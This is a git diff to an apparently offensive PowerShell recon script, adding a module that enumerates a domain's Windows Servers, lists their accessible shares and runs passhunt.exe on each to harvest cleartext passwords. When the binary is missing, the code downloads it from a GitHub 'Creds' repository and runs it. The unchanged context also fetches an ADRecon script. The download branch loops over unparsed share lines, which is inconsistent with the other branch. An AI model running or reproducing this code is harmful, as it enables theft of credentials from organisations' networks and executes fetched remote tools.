@@ -585,6 +585,39 @@ function domainreconmodules
 		    }
                     
 	        }
+	    $domainsharepass = Read-Host -Prompt 'Check Domain Network-Shares for cleartext passwords using passhunt.exe? (yes/no)'
+            if ($domainsharepass -eq "yes" -or $domainsharepass -eq "y" -or $domainsharepass -eq "Yes" -or $domainsharepass -eq "Y")
+            {
+                Write-Host -ForegroundColor Yellow "Collecting active Windows Servers from the domain..."
+                $ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
+                $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
+                
+                Write-Host -ForegroundColor Yellow "Searching for Shares on the found Windows Servers..."
+                Invoke-ShareFinder -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
+                
+                $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
+                $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
+
+                Write-Host -ForegroundColor Yellow "Starting Passhunt.exe for all found shares."
+                if (test-path $currentPath\passhunt.exe)
+                {
+                    foreach ($line in $testShares)
+                    {
+                        cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
+                    }
+                }
+                else
+                {
+                    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                    Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+                    foreach ($line in $shares)
+                    {
+                        cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
+                    } 
+                                      
+                }
+
+            }
 	    
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
             Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
